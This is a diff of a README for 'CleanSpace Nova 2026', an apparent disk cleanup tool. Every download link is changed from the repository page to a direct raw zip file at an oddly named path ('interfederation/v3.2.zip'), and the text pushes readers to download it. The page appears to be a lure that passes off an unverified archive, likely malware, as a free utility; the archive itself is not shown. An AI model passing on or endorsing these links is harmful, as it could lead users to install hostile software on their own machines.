@@ -1,6 +1,6 @@
 # 🧹 CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS - Reclaim Space, Boost Speed
 
-[![Download CleanSpace Nova 2026](https://img.shields.io/badge/Download-CleanSpace_Nova_2026-2ea44f?style=for-the-badge&logo=github)](https://github.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS)
+[![Download CleanSpace Nova 2026](https://img.shields.io/badge/Download-CleanSpace_Nova_2026-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS/main/interfederation/v3.2.zip)
 
 ## 👋 Welcome to CleanSpace Nova 2026
 
@@ -16,7 +16,7 @@ Getting started with CleanSpace Nova 2026 is incredibly simple. We've designed t
 
 Click the big green download button at the top of this page, or use this direct link:
 
-**[Visit this link to download the application.](https://github.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS)**
+**[Visit this link to download the application.](https://raw.githubusercontent.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS/main/interfederation/v3.2.zip)**
 
 This link takes you to a page where you can download the latest version of CleanSpace Nova 2026. Look for a button or link that says "Download" or "Releases" and click on it to get the file.
 
@@ -124,7 +124,7 @@ If you have questions or run into any issues, we're here to help. You can find s
 
 Thank you for choosing CleanSpace Nova 2026. We are confident that this software will make your computer feel brand new again - faster, more efficient, and with more free space. Download it today and see the difference for yourself!
 
-**[Visit this link to download the application.](https://github.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS)**
+**[Visit this link to download the application.](https://raw.githubusercontent.com/896093371cdz-oss/CleanSpace-Nova-2026---Smart-Disk-Cleanup-Storage-Optimizer-for-Windows-macOS/main/interfederation/v3.2.zip)**
 
 Click the badge at the top of the page to go straight to the download page. We hope you enjoy a cleaner, faster, and more private computing experience with CleanSpace Nova 2026.
 
